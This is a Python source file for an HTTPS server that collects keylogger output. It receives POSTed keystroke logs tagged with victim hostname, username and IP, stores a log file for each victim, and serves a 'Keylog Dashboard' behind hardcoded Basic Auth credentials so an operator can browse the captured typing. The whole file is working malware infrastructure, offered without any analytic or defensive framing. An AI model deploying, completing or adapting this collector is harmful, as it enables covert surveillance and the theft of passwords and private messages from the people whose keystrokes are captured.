from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl
import json
import os
import html
import base64
from urllib.parse import unquote
from datetime import datetime

HOST = "0.0.0.0"
PORT = 8888
SAVE_DIR = "./logs"
CERT_FILE = "server.crt"
KEY_FILE = "server.key"

# credentials for Basic Auth
AUTH_USER = "admin"
AUTH_PASS = "secret"

class KeylogHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        raw_data = self.rfile.read(content_length)
        try:
            data = raw_data.decode('utf-8')
            log = json.loads(data)
            hostname = log.get("hostname", "unknown")
            username = log.get("username", "unknown")
            ip = log.get("ip", "unknown")
            keylog_data = log.get("data", "")
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] ({ip}) {keylog_data}\n"
            os.makedirs(SAVE_DIR, exist_ok=True)
            filename = f"{hostname}_{username}.log"
            path = os.path.join(SAVE_DIR, filename)
            with open(path, "a", encoding="utf-8") as f:
                f.write(log_entry)
            self.send_response(200)
            self.end_headers()
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(400)
            self.end_headers()

    def do_GET(self):
        # Basic Auth for GET
        auth = self.headers.get('Authorization')
        if not auth or not auth.startswith('Basic '):
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="KeylogDashboard"')
            self.end_headers()
            return

        creds = base64.b64decode(auth.split(' ',1)[1]).decode('utf-8', 'ignore')
        user, _, pwd = creds.partition(':')
        if user != AUTH_USER or pwd != AUTH_PASS:
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="KeylogDashboard"')
            self.end_headers()
            return

        if self.path == '/':
            rows = []
            if os.path.isdir(SAVE_DIR):
                for fname in os.listdir(SAVE_DIR):
                    if not fname.endswith('.log'):
                        continue
                    hn, un = fname[:-4].split('_', 1)
                    path = os.path.join(SAVE_DIR, fname)
                    # get last modified time
                    last_update = datetime.fromtimestamp(
                        os.path.getmtime(path)
                    ).strftime("%Y-%m-%d %H:%M:%S")
                    # extract IP from first line
                    ip = "unknown"
                    with open(path, encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            try:
                                ip = line.split('] (',1)[1].split(')')[0]
                                break
                            except:
                                continue
                    rows.append((ip, hn, un, fname, last_update))

            html_content = '<html><head><meta charset="utf-8"><title>Keylog Dashboard</title></head><body>'
            html_content += '<h2>Keylog Senders</h2>'
            html_content += '<table border="1" cellpadding="5">'
            html_content += '<tr><th>IP</th><th>Hostname</th><th>Username</th><th>Last Update</th></tr>'
            for ip, hn, un, fname, lu in rows:
                link = f'/view/{fname}'
                html_content += (
                    '<tr>'
                    f'<td>{html.escape(ip)}</td>'
                    f'<td>{html.escape(hn)}</td>'
                    f'<td><a href="{link}">{html.escape(un)}</a></td>'
                    f'<td>{html.escape(lu)}</td>'
                    '</tr>'
                )
            html_content += '</table></body></html>'

            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(html_content.encode('utf-8'))))
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))
            return

        if self.path.startswith('/view/'):
            raw = unquote(self.path[len('/view/'):])
            safe = os.path.basename(raw)
            path = os.path.join(SAVE_DIR, safe)
            if os.path.isfile(path):
                with open(path, encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                body = (
                    '<html><head><meta charset="utf-8"><title>Log: '
                    + html.escape(safe)
                    + '</title></head><body>'
                    + f'<h2>Log file: {html.escape(safe)}</h2>'
                    + '<pre style="background:#f0f0f0;padding:10px;">'
                    + html.escape(content)
                    + '</pre></body></html>'
                )
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body.encode('utf-8'))))
                self.end_headers()
                self.wfile.write(body.encode('utf-8'))
                return

        self.send_response(404)
        self.end_headers()

if __name__ == "__main__":
    httpd = HTTPServer((HOST, PORT), KeylogHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    print(f"[+] HTTPS server listening on https://{HOST}:{PORT}")
    httpd.serve_forever()
